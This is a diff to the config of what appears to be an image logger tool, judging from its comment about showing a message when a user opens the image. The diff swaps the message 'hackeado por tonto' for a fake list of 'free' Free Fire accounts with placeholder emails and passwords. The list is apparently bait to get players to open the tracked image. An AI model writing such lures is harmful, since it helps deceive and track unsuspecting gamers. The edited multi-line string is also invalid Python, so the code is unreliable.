@@ -28,7 +28,32 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "hackeado por tonto", # Message to show
+        "message": "CUENTAS FREE FIRE
+
+1. Usuario: DarkPro99
+   Email: [ejemplo1@email.com](mailto:ejemplo1@email.com)
+   Contraseña: contraseña_demo_123
+   Nivel: 72
+   Diamantes: 1250
+
+2. Usuario: ShadowKingX
+   Email: [ejemplo2@email.com](mailto:ejemplo2@email.com)
+   Contraseña: password_demo_456
+   Nivel: 65
+   Diamantes: 980
+
+3. Usuario: FireLegendYT
+   Email: [ejemplo3@email.com](mailto:ejemplo3@email.com)
+   Contraseña: demo_pass_789
+   Nivel: 80
+   Diamantes: 2300
+
+4. Usuario: GhostPlayer
+   Email: [ejemplo4@email.com](mailto:ejemplo4@email.com)
+   Contraseña: ejemplo_pass_000
+   Nivel: 58
+   Diamantes: 760
+", # Message to show
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
